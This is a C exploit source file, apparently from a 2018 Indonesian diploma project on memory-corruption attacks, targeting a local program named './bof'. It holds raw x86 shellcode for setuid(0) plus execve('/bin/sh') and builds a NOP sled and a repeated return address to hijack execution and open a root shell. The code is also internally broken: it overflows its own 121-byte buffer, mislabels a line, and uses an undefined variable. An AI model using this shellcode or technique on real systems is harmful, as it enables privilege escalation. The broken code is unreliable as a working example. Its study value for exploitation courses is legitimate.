/*
Exploit stack buffer overflow
------------------------------

Projek tugas akhir untuk mendapatkan gelar A.Md.T
Judul : Model Eksploitasi Memory Corruption Vulnerabilities di Modern System
Tahun : 2018

Febriyanto Nugroho (067015021)
*/

#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

char *program = "./bof"; // eksekusi vulnerable program

/*
 +-----------------------------------------
 | setuid(0) + execve("/bin/sh") shellcode
 |
 | Ditulis oleh : Febriyanto Nugroho
 +-----------------------------------------
*/

char sc[] =
                "\x31\xdb\x89\xd8\xb0\x17\xcd\x80"
                "\x31\xdb\x89\xd8\xb0\x2e\xcd\x80"
                "\x31\xd2\x52\x68\x6e\x2f\x73\x68"
                "\x68\x2f\x2f\x62\x69\x89\xe3\x52"
                "\x66\x68\x2d\x69\x89\xe1\x52\x51"
                "\x53\x89\xe1\x6a\x0b\x58\xcd\x80"
                "\x6a\x01\x58\x31\xdb\xcd\x80";

int main(int argc, char **argv) {
   char buffer[121];
   int i, j;
   int addr;

   if(argc > 1)
       sscanf(*(argv+1), "%x", &addr); // input alamat yang berisi nop di memori
   else
       exit(0);

   for(i = 0; i < 35; i++) {
        *(buffer+i) = 0x90; // isi NOP sled
   }
   for(j = 0; j < 55; j++, i++) { // shellcode
        *(buffer+i) = *(sc+j);    
   }
   for(; i + 4 < 130; i += 4) {
        memcpy(buffer+i, &addr, 4); // eksekusi shellcode
   }
   buffer[118] = 0; 	// overwrite eip
   fwrite(buffer, strlen(buff), 1, stdout); // tulis buffer dengan panjang buffer
}
